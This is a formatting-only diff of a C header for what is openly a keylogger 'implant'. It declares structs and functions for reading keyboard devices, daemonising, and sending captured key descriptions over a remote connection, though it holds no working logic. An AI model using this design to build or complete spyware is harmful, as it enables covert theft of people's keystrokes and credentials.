@@ -16,8 +16,7 @@
     also holds its file descriptor
 */
 typedef struct keyboard_s keyboard_t;
-struct keyboard_s
-{
+struct keyboard_s {
     int fd;
 
     ssize_t nb_chars;
@@ -28,9 +27,8 @@ struct keyboard_s
     devices;
 };
 
-typedef struct translated_key
-{
-    char const* description;
+typedef struct translated_key {
+    char const *description;
     char const representation;
 } translated_key_t;
 
@@ -39,8 +37,7 @@ typedef struct translated_key
     port & IP address, whether debug mode is enabled
     or stuff like this
 */
-typedef struct implant_s
-{
+typedef struct implant_s {
 
     /* remote connection settings */
     unsigned short port;
@@ -61,9 +58,8 @@ typedef struct implant_s
 
 #ifndef DEBUG_LOG
 #define DEBUG_LOG(s, ...)                              \
-    do                                                 \
-    {                                                  \
-        char data[256] = { 0 };                        \
+    do {                                               \
+        char data[256] = {0};                          \
         if (0 > snprintf(data, 255, s, ##__VA_ARGS__)) \
             _exit(1);                                  \
         syslog(LOG_NOTICE, data);                      \
@@ -74,37 +70,29 @@ typedef struct implant_s
 #define KEY_RELEASED 0
 
 // net.c
-int
-init_remote_connection(implant_t*);
-int
-send_key_description(int, char[STRING_BUFFER_SIZE]);
+int init_remote_connection(implant_t *);
+int send_key_description(int, char[STRING_BUFFER_SIZE]);
 
 // opt.c
-int
-parse_user_input(int, char**, implant_t*);
+int parse_user_input(int, char **, implant_t *);
 
 // logger.c
-void
-keylog(implant_t*, int);
+void keylog(implant_t *, int);
 
 // keyboard.c
-void
-fetch_available_keyboards(implant_t*);
+void fetch_available_keyboards(implant_t *);
 
 // daemon.c
-void
-daemon_setup(void);
+void daemon_setup(void);
 
 // utils.c
-int
-read_file(char const*, char**);
+int read_file(char const *, char **);
 size_t
-get_array_size(uint8_t**);
-char*
-remove_repeating_whitespaces(char*);
-void
-free_tab(uint8_t**);
-char**
-tabgen(const char*, char);
+get_array_size(uint8_t **);
+char *
+remove_repeating_whitespaces(char *);
+void free_tab(uint8_t **);
+char **
+tabgen(const char *, char);
 
 #endif /* IMPLANT_H */
